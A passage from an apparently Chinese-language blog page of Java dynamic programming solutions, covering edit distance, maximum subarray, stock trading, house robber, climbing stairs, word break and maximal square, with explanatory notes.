class="hljs-keyword">this</span>.dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[length1 + <span class="hljs-number">1</span>][length2 + <span class="hljs-number">1</span>];<br>   <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt;= length1;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j &lt;= length2;j++)&#123;<br>                dp[i][j] = -<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-comment">//i，j 初始化指向最后一个索引</span><br>    <span class="hljs-keyword">return</span> helper(length1, length2);<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">helper</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i,<span class="hljs-keyword">int</span> j)</span></span>&#123;<br>        <span class="hljs-comment">//备忘录</span><br>        <span class="hljs-keyword">if</span>(dp[i][j] &gt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> dp[i][j];<br>        &#125;<br>        <span class="hljs-comment">//base case</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>) &#123;<br>            dp[i][j] = i + j;<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//状态转移</span><br>            <span class="hljs-keyword">if</span>(word1.charAt(i - <span class="hljs-number">1</span>) == word2.charAt(j - <span class="hljs-number">1</span>))&#123;<br>                dp[i][j] = helper(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>);  <span class="hljs-comment">//啥都不做</span><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//插入，删除，替换</span><br>                dp[i][j] =  Math.min(<br>                    Math.min(helper(i, j - <span class="hljs-number">1</span>), helper(i - <span class="hljs-number">1</span>, j)),<br>                    helper(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>           <br>        <span class="hljs-keyword">return</span> dp[i][j];<br>    &#125;<br></code></pre></td></tr></table></figure><p>自底向上解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = s1.length(), n = s2.length();<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m + <span class="hljs-number">1</span>][n + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// base case </span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>        dp[i][<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>        dp[<span class="hljs-number">0</span>][j] = j;<br>    <span class="hljs-comment">// 自底向上求解</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>            <span class="hljs-keyword">if</span> (s1.charAt(i-<span class="hljs-number">1</span>) == s2.charAt(j-<span class="hljs-number">1</span>))&#123;<br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            &#125; <br>            <span class="hljs-keyword">else</span>&#123;<br>                dp[i][j] = Math.min(<br>                    Math.min(dp[i - <span class="hljs-number">1</span>][j] + <span class="hljs-number">1</span>,dp[i][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>),<br>                    dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span><br>                );<br>            &#125;               <br>                <br>    <span class="hljs-comment">// 储存着整个 s1 和 s2 的最小编辑距离</span><br>    <span class="hljs-keyword">return</span> dp[m][n];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-8-最大子序和"><a href="#6-8-最大子序和" class="headerlink" title="6.8 最大子序和"></a>6.8 最大子序和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">int</span> dp_0 = nums[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">int</span> dp_1 = <span class="hljs-number">0</span>, res = dp_0;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-comment">// dp[i] = max(nums[i], nums[i] + dp[i-1])</span><br>        dp_1 = Math.max(nums[i], nums[i] + dp_0);<br>        dp_0 = dp_1;<br>        <span class="hljs-comment">// 顺便计算最大的结果</span><br>        res = Math.max(res, dp_1);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-9-最长递增子序列"><a href="#6-9-最长递增子序列" class="headerlink" title="6.9 最长递增子序列"></a>6.9 最长递增子序列</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLIS</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> dp[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];<br>    Arrays.fill(dp,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)&#123;<br>            <span class="hljs-keyword">if</span>(nums[i] &gt; nums[j])&#123;<br>                dp[i] = Math.max(dp[i],dp[j] + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dp.length; i++)&#123;<br>        res = Math.max(res,dp[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-10-买卖股票的最佳时机"><a href="#6-10-买卖股票的最佳时机" class="headerlink" title="6.10 买卖股票的最佳时机"></a>6.10 买卖股票的最佳时机</h2><p>动态规划</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br><span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][<span class="hljs-number">2</span>];<br><br><span class="hljs-comment">//状态转移</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>    <span class="hljs-keyword">if</span> (i - <span class="hljs-number">1</span> == -<span class="hljs-number">1</span>) &#123;<br>            dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// 解释：</span><br>            <span class="hljs-comment">//   dp[i][0] </span><br>            <span class="hljs-comment">// = max(dp[-1][0], dp[-1][1] + prices[i])</span><br>            <span class="hljs-comment">// = max(0, -infinity + prices[i]) = 0</span><br>            dp[i][<span class="hljs-number">1</span>] = -prices[i];<br>            <span class="hljs-comment">//解释：</span><br>            <span class="hljs-comment">//   dp[i][1] </span><br>            <span class="hljs-comment">// = max(dp[-1][1], dp[-1][0] - prices[i])</span><br>            <span class="hljs-comment">// = max(-infinity, 0 - prices[i]) </span><br>            <span class="hljs-comment">// = -prices[i]</span><br>            <span class="hljs-keyword">continue</span>;<br>     &#125;<br>         dp[i][<span class="hljs-number">0</span>] = Math.max(dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>],dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>] + prices[i]);<br>         dp[i][<span class="hljs-number">1</span>] = Math.max(dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>],-prices[i]);<br>     &#125;<br><span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>优化空间：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// k == 1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_k_1</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-comment">// base case: dp[-1][0] = 0, dp[-1][1] = -infinity</span><br>    <span class="hljs-keyword">int</span> dp_i_0 = <span class="hljs-number">0</span>, dp_i_1 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-comment">// dp[i][0] = max(dp[i-1][0], dp[i-1][1] + prices[i])</span><br>        dp_i_0 = Math.max(dp_i_0, dp_i_1 + prices[i]);<br>        <span class="hljs-comment">// dp[i][1] = max(dp[i-1][1], -prices[i])</span><br>        dp_i_1 = Math.max(dp_i_1, -prices[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i_0;<br>&#125;<br></code></pre></td></tr></table></figure><p>一次遍历的方法，依次遍历，假定每天尝试卖出，搜索当前天之前的历史最低价格</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> prices[])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> minprice = Integer.MAX_VALUE;<br>    <span class="hljs-keyword">int</span> maxprofit = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; prices.length; i++) &#123;<br>    <span class="hljs-keyword">if</span> (prices[i] &lt; minprice) &#123;<br>    minprice = prices[i];<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prices[i] - minprice &gt; maxprofit) &#123;<br>    maxprofit = prices[i] - minprice;<br>   &#125;<br>    &#125;<br><span class="hljs-keyword">return</span> maxprofit;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-11-打家劫舍"><a href="#6-11-打家劫舍" class="headerlink" title="6.11 打家劫舍"></a>6.11 打家劫舍</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] memo;<br><span class="hljs-comment">// 主函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化备忘录</span><br>    memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];<br>    Arrays.fill(memo, -<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 强盗从第 0 间房子开始抢劫</span><br>    <span class="hljs-keyword">return</span> dp(nums, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// 返回 dp[start..] 能抢到的最大值</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (start &gt;= nums.length) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 避免重复计算</span><br>    <span class="hljs-keyword">if</span> (memo[start] != -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> memo[start];<br><br>    <span class="hljs-keyword">int</span> res = Math.max(dp(nums, start + <span class="hljs-number">1</span>), <br>                    nums[start] + dp(nums, start + <span class="hljs-number">2</span>));<br>    <span class="hljs-comment">// 记入备忘录</span><br>    memo[start] = res;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-12-爬楼梯"><a href="#6-12-爬楼梯" class="headerlink" title="6.12 爬楼梯"></a>6.12 爬楼梯</h2><p>自顶向下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> memo[];<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">return</span> dp(memo,n);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] memo,<span class="hljs-keyword">int</span> n)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span> || n == <span class="hljs-number">1</span>)&#123;<br>        memo[n] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> memo[n];<br>    &#125;<br>    <span class="hljs-keyword">if</span>(memo[n] &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> memo[n];<br>    &#125;<br>    memo[n] = dp(memo,n - <span class="hljs-number">1</span>) + dp(memo,n - <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> memo[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>自底向上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-comment">//base case</span><br>    <span class="hljs-keyword">int</span> dp0 = <span class="hljs-number">1</span>,dp1 = <span class="hljs-number">1</span>,dp2 = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//状态转移</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; n + <span class="hljs-number">1</span>; i++)&#123;<br>        dp2 = dp0 + dp1;<br>        dp0 = dp1;<br>        dp1 = dp2;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp2;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-13-最小路径和"><a href="#6-13-最小路径和" class="headerlink" title="6.13 最小路径和"></a>6.13 最小路径和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minPathSum</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] grid)</span> </span>&#123;<br>       <span class="hljs-keyword">int</span> m = grid.length,n = grid[<span class="hljs-number">0</span>].length;<br>       <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m][n];<br><br>       <span class="hljs-comment">//base case</span><br>       dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++)&#123;<br>           dp[i][<span class="hljs-number">0</span>] = grid[i][<span class="hljs-number">0</span>] + dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]; <br>       &#125;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++)&#123;<br>           dp[<span class="hljs-number">0</span>][j] = grid[<span class="hljs-number">0</span>][j] + dp[<span class="hljs-number">0</span>][j - <span class="hljs-number">1</span>]; <br>       &#125;<br>       <span class="hljs-comment">//状态转移</span><br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++)&#123;<br>           <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++)&#123;<br>               dp[i][j] = Math.min(dp[i - <span class="hljs-number">1</span>][j],dp[i][j - <span class="hljs-number">1</span>]) + grid[i][j]; <br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> dp[m - <span class="hljs-number">1</span>][n - <span class="hljs-number">1</span>];<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="6-14-单词拆分"><a href="#6-14-单词拆分" class="headerlink" title="6.14 单词拆分"></a>6.14 单词拆分</h2><p>完全背包问题</p><p>wordDict是物品列表，且可以无限使用，非空字符串s是背包。</p><p>$dp[i]$为true代表以i结尾的s子串可以拆分为一个或多个在字典中出现的单词。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">wordBreak</span><span class="hljs-params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;<br>    Set&lt;String&gt; wordDictSet = <span class="hljs-keyword">new</span> HashSet(wordDict);<br>    <span class="hljs-keyword">int</span> n = s.length();<br>    <span class="hljs-keyword">boolean</span> dp[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-comment">//base case</span><br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-keyword">true</span>;<br>    <span class="hljs-comment">//状态转移</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)&#123;<br>            <span class="hljs-keyword">if</span>(dp[j] &amp;&amp; wordDictSet.contains(s.substring(j,i)))&#123;<br>                dp[i] = <span class="hljs-keyword">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> dp[n];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-15-乘积最大子数组"><a href="#6-15-乘积最大子数组" class="headerlink" title="6.15 乘积最大子数组"></a>6.15 乘积最大子数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxProduct</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>     <span class="hljs-keyword">int</span> n = nums.length;<br>     <span class="hljs-keyword">int</span> res = Integer.MIN_VALUE;<br>     <span class="hljs-keyword">int</span> dpMax = <span class="hljs-number">1</span>,dpMin = <span class="hljs-number">1</span>;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>         <span class="hljs-keyword">if</span>(nums[i] &lt; <span class="hljs-number">0</span>)&#123;<br>             <span class="hljs-keyword">int</span> temp = dpMax;<br>             dpMax = dpMin;<br>             dpMin = temp;<br>         &#125;<br>         dpMax = Math.max(dpMax * nums[i],nums[i]);<br>         dpMin = Math.min(dpMin * nums[i],nums[i]);<br>     <br>         res = Math.max(dpMax,res);<br>     &#125;<br>     <span class="hljs-keyword">return</span> res;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="6-16-最大正方形"><a href="#6-16-最大正方形" class="headerlink" title="6.16 最大正方形"></a>6.16 最大正方形</h2><p>可以使用动态规划降低时间复杂度。我们用$ \textit{dp}(i, j)$ 表示以 $(i, j)$ 为右下角，且只包含 1 的正方形的边长最大值。如果我们能计算出所有 $\textit{dp}(i, j)$ 的值，那么其中的最大值即为矩阵中只包含 1 的正方形的边长最大值，其平方即为最大正方形的面积。</p><p>那么如何计算 $\textit{dp}$ 中的每个元素值呢？对于每个位置 $(i, j)$，检查在矩阵中该位置的值：</p><p>如果该位置的值是 0，则 $\textit{dp}(i, j) = 0$，因为当前位置不可能在由 1 组成的正方形中；</p><p>如果该位置的值是 1，则 $\textit{dp}(i, j)$的值由其上方、左方和左上方的三个相邻位置的$ \textit{dp}$ 值决定。具体而言，当前位置的元素值等于三个相邻位置的元素中的最小值加 1，状态转移方程如下：</p><script type="math/tex; mode=display">dp(i,j)=min(dp(i−1,j),dp(i−1,j−1),dp(i,j−1))+1</script><p>先来阐述简单共识</p><p>若形成正方形（非单 1），以当前为右下角的视角看，则需要：当前格、上、左、左上都是 1<br>可以换个角度：当前格、上、左、左上都不能受 0 的限制，才能成为正方形</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/最大正方形状态转移.png" style="zoom:67%;" /></p><p>上面详解了 三者取最小 的含义：</p><p>图 1：受限于左上的 0<br>图 2：受限于上边的 0<br>图 3：受限于左边的 0<br>数字表示：以此为正方形右下角的最大边长<br>黄色表示：格子 ? 作为右下角的正方形区域<br>就像 木桶的短板理论 那样——附近的最小边长，才与 ? 的最长边长有关。</p><ul><li>从上述图解中，我们似乎得到的只是「动态规划 推进 的过程」，即「如何从前面的 dp 推出后面的 dp」，甚至还只是感性理解</li><li>距离代码我们还缺：dp 具体定义如何，数组多大，初值如何，如何与题目要求的面积相关</li><li>dp 具体定义：$dp[i + 1][j + 1]$ 表示 「以第 i 行、第 j 列为右下角的正方形的最大边长」<ul><li>为何不是 $dp[i][j]$</li><li>回到图解中，任何一个正方形，我们都「依赖」当前格 左、上、左上三个方格的情况</li><li>但第一行的上层已经没有格子，第一列左边已经没有格子，需要做特殊 if 判断来处理</li><li>为了代码简洁，我们 假设补充 了多一行全 ‘0’、多一列全 ‘0’</li></ul></li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/035ec1919a802f81078ce40bde8c33d6c0990b486ce3aebd846d1fdf79241221-image.png" alt=""></p><ul><li>此时 dp 数组的大小也明确为$ new dp[height + 1][width + 1]$</li><li>初始值就是将第一列 $dp[row][0] $、第一行$ dp[0][col] $都赋为 0，相当于已经计算了所有的第一行、第一列的 dp 值</li><li>题目要求面积。根据 「面积 = 边长 x 边长」可知，我们只需求出 最大边长 即可<ul><li>定义 maxSide 表示最长边长，每次得出一个 dp，就 maxSide = max(maxSide, dp);</li><li>最终返回 return maxSide * maxSide;</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maximalSquare</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] matrix)</span> </span>&#123;<br>    <span class="hljs-comment">// base condition</span><br>    <span class="hljs-keyword">if</span> (matrix == <span class="hljs-keyword">null</span> || matrix.length &lt; <span class="hljs-number">1</span> || matrix[<span class="hljs-number">0</span>].length &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    